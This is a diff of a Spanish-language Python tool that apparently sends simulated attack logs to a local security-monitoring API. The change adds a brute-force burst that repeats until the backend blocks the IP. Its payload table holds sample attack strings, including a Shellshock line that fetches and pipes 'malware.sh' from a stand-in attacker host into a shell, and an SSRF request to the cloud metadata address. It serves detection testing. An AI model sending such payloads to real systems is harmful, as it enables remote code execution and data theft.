@@ -3,6 +3,7 @@ import sqlite3
 import os
 import requests
 import random
+import time
 
 API_URL = "http://localhost:8000/api/v1/ingest"
 DB_PATH = "security_vault.db"  # Conexión directa al vault local de tu Mac
@@ -11,7 +12,7 @@ DB_PATH = "security_vault.db"  # Conexión directa al vault local de tu Mac
 PAYLOADS_ATAQUE = {
     "1": {
         "tipo": "Brute Force Attack",
-        "log": "2026-06-08 21:05:12 - user=admin - ip=198.51.100.45 - STATUS: FAILED LOGIN - Attempt 15/15"
+        "log": "2026-06-19 04:21:00 - user=admin - STATUS: FAILED LOGIN - Attempt"
     },
     "2": {
         "tipo": "SQL Injection (SQLi)",
@@ -27,10 +28,8 @@ PAYLOADS_ATAQUE = {
     },
     "5": {
         "tipo": "Remote Code Execution (RCE) - Shellshock",
-        # Incluimos metacaracteres claros (; |) y comandos en minúsculas (whoami, id, wget)
         "log": "GET /cgi-bin/stats.cgi HTTP/1.1 - Host: vulnerable.com - User-Agent: () { :;}; /bin/bash -c 'whoami; id; wget http://atacker.com/malware.sh | sh'"
     },
-    # ... resto de payloads ...
     "6": {
         "tipo": "SSRF Attack",
         "log": "GET /fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4 HTTP/1.1"
@@ -42,7 +41,6 @@ PAYLOADS_ATAQUE = {
 }
 
 def obtener_clientes_desde_vault():
-    """Lee el archivo SQLite en caliente para obtener los inquilinos y tokens vigentes"""
     if not os.path.exists(DB_PATH):
         print(f"❌ Error: No se detecta el archivo '{DB_PATH}' en este directorio.")
         return {}
@@ -52,11 +50,8 @@ def obtener_clientes_desde_vault():
     clientes_dict = {}
     
     try:
-        # Solo traemos los clientes con estatus ACTIVO
         cursor.execute("SELECT id, empresa_name, api_key FROM sakti_customers WHERE estatus = 'ACTIVO';")
         rows = cursor.fetchall()
-        
-        # Mapeamos un índice visual (1, 2, 3...) para el menú interactivo
         for index, row in enumerate(rows, start=1):
             clientes_dict[str(index)] = {
                 "id_db": row[0],
@@ -67,39 +62,39 @@ def obtener_clientes_desde_vault():
         print(f"❌ Error al consultar el Vault SQLite: {e}")
     finally:
         conn.close()
-        
     return clientes_dict
 
-def enviar_trafico(token_cliente, nombre_cliente, payload_log, tipo_ataque):
+def enviar_trafico(token_cliente, nombre_cliente, payload_log, tipo_ataque, ip_fija=None):
     headers = {
         "X-Sakti-Token": token_cliente,
         "Content-Type": "application/json"
     }
     
-    ip_ficticia = f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
+    # Si pasamos una IP fija (Fuerza Bruta), la mantiene. Si no, genera una aleatoria (Web Exploits).
+    ip_final = ip_fija if ip_fija else f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
     
     data = {
-        "client_ip": ip_ficticia,
+        "client_ip": ip_final,
         "log_entry": payload_log
     }
     
-    print(f"\n📡 [DISPARANDO] {tipo_ataque} contra {nombre_cliente}...")
+    print(f"📡 [DISPARANDO] {tipo_ataque} desde IP: {ip_final} contra {nombre_cliente}...")
     try:
         response = requests.post(API_URL, json=data, headers=headers)
         if response.status_code == 200:
             res_json = response.json()
             print(f"✅ API RESPUESTA (200 OK):")
-            print(f"   • Cliente Autenticado: {res_json.get('client')}")
             print(f"   • Core Decision: {res_json.get('decision_core', 'N/A')}")
             print(f"   • Mensaje: {res_json.get('message')}")
+            return res_json.get('decision_core', 'N/A')
         else:
             print(f"❌ Error en la API Ingest ({response.status_code}): {response.text}")
     except Exception as e:
         print(f"❌ Error de conexión de red con el backend: {e}")
+    return "ERROR"
 
 def menu():
     while True:
-        # 🔄 Consultamos la DB en cada iteración del bucle principal
         clientes_vigentes = obtener_clientes_desde_vault()
         
         print("\n" + "="*60)
@@ -113,7 +108,6 @@ def menu():
         else:
             for opcion, datos in clientes_vigentes.items():
                 print(f" [{opcion}] {datos['nombre']}")
-            # Dejamos una opción de salida dinámica calculando el último índice + 1
             opcion_salir = str(len(clientes_vigentes) + 1)
             print(f" [{opcion_salir}] Salir")
         
@@ -142,13 +136,34 @@ def menu():
             
         payload_elegido = PAYLOADS_ATAQUE[opcion_payload]
         
-        # Lanzar la telemetría controlada usando el token real extraído de la DB
-        enviar_trafico(
-            token_cliente=cliente_elegido["token"],
-            nombre_cliente=cliente_elegido["nombre"],
-            payload_log=payload_elegido["log"],
-            tipo_ataque=payload_elegido["tipo"]
-        )
+        # 🎯 LÓGICA LOGÍSTICA DE FUERZA BRUTA DE SAKTI
+        if opcion_payload == "1":
+            print("\n🚀 [RÁFAGA] Iniciando simulación de ataque de Fuerza Bruta distribuido temporalmente...")
+            ip_ataque_bruto = f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            
+            # Lanzamos 4 intentos seguidos con la misma IP para obligar a saltar el umbral (>=2 anteriores + el actual)
+            for intento in range(1, 5):
+                print(f"\n[Intento {intento}/4]")
+                log_con_intento = f"{payload_elegido['log']} {intento}/4"
+                decision = enviar_trafico(
+                    token_cliente=cliente_elegido["token"],
+                    nombre_cliente=cliente_elegido["nombre"],
+                    payload_log=log_con_intento,
+                    tipo_ataque=payload_elegido["tipo"],
+                    ip_fija=ip_ataque_bruto
+                )
+                if "BLOQUEADO" in decision:
+                    print(f"💥 [ÉXITO SOAR]: El orquestador ha bloqueado la IP {ip_ataque_bruto} en el intento {intento}.")
+                    break
+                time.sleep(1) # Pequeña pausa de red entre ráfagas
+        else:
+            # Flujo estándar para vectores web unitarios (SQLi, XSS, SSRF, RCE...)
+            enviar_trafico(
+                token_cliente=cliente_elegido["token"],
+                nombre_cliente=cliente_elegido["nombre"],
+                payload_log=payload_elegido["log"],
+                tipo_ataque=payload_elegido["tipo"]
+            )
         print("="*60)
 
 if __name__ == "__main__":
